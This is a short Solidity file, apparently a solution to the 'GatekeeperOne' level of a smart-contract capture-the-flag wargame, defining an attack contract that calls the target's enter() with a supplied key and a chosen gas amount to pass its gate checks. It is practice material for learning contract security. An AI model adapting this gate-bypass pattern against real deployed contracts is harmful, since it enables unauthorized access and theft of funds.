pragma solidity ^0.6.0;

import "./13-GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOneContract;
    bool public flag = false;

    constructor(address gatekeeperOneAddress) public {
        gatekeeperOneContract = GatekeeperOne(gatekeeperOneAddress);
    }

    function attack(bytes8 _gateKey, uint256 gasToUse) public {
        gatekeeperOneContract.enter{gas: gasToUse}(_gateKey);
        flag = true;
    }
}
